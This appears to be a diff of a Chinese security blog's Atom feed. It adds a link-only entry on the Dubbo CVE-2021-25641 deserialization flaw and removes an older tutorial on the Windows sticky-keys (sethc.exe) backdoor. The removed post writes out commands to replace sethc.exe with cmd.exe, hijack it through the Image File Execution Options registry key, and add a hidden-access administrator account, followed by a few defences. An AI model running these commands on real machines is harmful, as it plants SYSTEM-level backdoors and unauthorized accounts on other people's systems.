@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.mi1k7ea.com/"/>
-  <updated>2021-06-20T05:49:45.915Z</updated>
+  <updated>2021-07-04T03:46:44.576Z</updated>
   <id>https://www.mi1k7ea.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>浅析Dubbo Kryo/FST反序列化漏洞（CVE-2021-25641）</title>
+    <link href="https://www.mi1k7ea.com/2021/07/04/%E6%B5%85%E6%9E%90Dubbo-Kryo-FST%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-25641%EF%BC%89/"/>
+    <id>https://www.mi1k7ea.com/2021/07/04/浅析Dubbo-Kryo-FST反序列化漏洞（CVE-2021-25641）/</id>
+    <published>2021-07-04T03:45:40.000Z</published>
+    <updated>2021-07-04T03:46:44.576Z</updated>
+    
+    <content type="html"><![CDATA[<p>发布于公众号98KSec：</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzk0MTIxNzAyNw==&amp;mid=2247483723&amp;idx=1&amp;sn=338ef80c95571470e19d107812d76642&amp;chksm=c2d48527f5a30c31e172e9ae33de73c681ad82d98addb26514e221590e9e4121de584e1cc2bc&amp;token=1938137287&amp;lang=zh_CN#rd" target="_blank" rel="noopener">浅析Dubbo Kryo/FST反序列化漏洞（CVE-2021-25641）</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzk0MTIxNzAyNw==&amp;mid=2247483723&amp;idx=2&amp;sn=8515dd81cfe9020c8f9d4a5ef01056e3&amp;chksm=c2d48527f5a30c31ef4176a17b8e82c8bd6a8593a60f7edbdba8ecd3aa591bd86c6099f99bc2&amp;token=1938137287&amp;lang=zh_CN#rd" target="_blank" rel="noopener">Dubbo基础篇</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;发布于公众号98KSec：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=Mzk0MTIxNzAyNw==&amp;amp;mid=2247483723&amp;amp;idx=1&amp;amp;sn=338ef80c95571470e19d1
+      
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>浅析Jetty URI路径限制绕过漏洞</title>
@@ -491,28 +513,6 @@
       <category term="Windows" scheme="https://www.mi1k7ea.com/tags/Windows/"/>
     
       <category term="DoublePulsar" scheme="https://www.mi1k7ea.com/tags/DoublePulsar/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Windows Shift后门利用</title>
-    <link href="https://www.mi1k7ea.com/2021/03/26/Windows-Shift%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/"/>
-    <id>https://www.mi1k7ea.com/2021/03/26/Windows-Shift后门利用/</id>
-    <published>2021-03-26T15:55:01.000Z</published>
-    <updated>2021-03-26T16:31:02.215Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>通常，在内网渗透打下一台机子之后，可以给这台机子留个Shift后门。</p><h2 id="0x01-Shift后门利用"><a href="#0x01-Shift后门利用" class="headerlink" title="0x01 Shift后门利用"></a>0x01 Shift后门利用</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>粘滞键漏洞，在Windows系统下连续按5下SHIFT键，可以启动系统的粘滞键功能，其进程名为Sethc.exe，应用程序在Windows\system32下。</p><p>黑客用其它应用程序（如：cmd.exe、explorer.exe 或木马、病毒）将Sethc.exe替换。当再次连续按5次SHIFT键，就会启动黑客替换的应用程序，如此便留下了5下SHIFT后门，黑客3389登录远程计算机时，在用户登录界面，连续按5下SHIFT就可以启动该漏洞，进而控制远程计算机。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在Windows系统登录界面状态下，粘滞键仍可以以连续按5下SHIFT键运行，并且此时应用程序会以WINDOWS的最高权限－SYSTEM权限运行，所以计算机一旦被安装该后门，入侵者便可悄无声息地远程操纵计算机。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>大致思路如下：</p><p>拿到目标主机权限后，到Windows\system32目录下，将sethc.exe替换成cmd.exe；</p><p>其中，命令行方式为：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe</span><br><span class="line">copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe</span><br><span class="line">attrib c:\windows\system32\sethc.exe +h</span><br><span class="line">attrib c:\windows\system32\dllcache\sethc.exe +h</span><br></pre></td></tr></table></figure><p>注意：要将dllcache文件夹中的缓存删掉，否则会自动复原回去。</p><p>注册表方式为：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"</span> /v Debugger /t REG_SZ /d <span class="string">"C:\windows\system32\cmd.exe"</span></span><br></pre></td></tr></table></figure><p>命令说明：reg add是向注册表添加记录，后面跟的是注册表的位置，注意的是HKLM是HKEY_LOCAL_MACHINE的缩写。Image File Execution Option这个目录是用来设置镜像劫持的，要被劫持的就是命令中的sethc粘滞键程序，随后通过<code>/ v</code>来指定键名，其中键名debugger是固定的，然后通过<code>/ t</code>来指定REG_SZ字符串类型，最后通过<code>/ d</code>来指定键的值，即被恶意替换的程序cmd.exe。</p><p>这样，在下次远程连接目标主机登录的时候就可以连续5下SHIFT触发cmd.exe；</p><p>可以输入explorer.exe调出程序管理系统方便操作；</p><p>当然，上面的方法存在缺陷，就是可能会导致远程连接无法持久进行，因此可以直接添加新用户便于下次直接登录：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user mi1k7ea <span class="number">123456</span> /add</span><br><span class="line">net localgroup administrators mi1k7ea /add<span class="string">'</span></span><br></pre></td></tr></table></figure><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul><li>如果系统盘为NTFS文件系统，可以将sytem32下的sethc.exe文件设为everyone拒绝访问；</li><li>直接将其删除，最好的方法是在控制面板-辅助功能选项-粘滞键选项，将“使用快捷键”取消即可。；</li><li>通过注册表设置实现防御；</li></ul>]]></content>
-    
-    <summary type="html">
-    
-      已完结.
-    
-    </summary>
-    
-      <category term="渗透测试基础" scheme="https://www.mi1k7ea.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
-    
-    
-      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
   </entry>
   
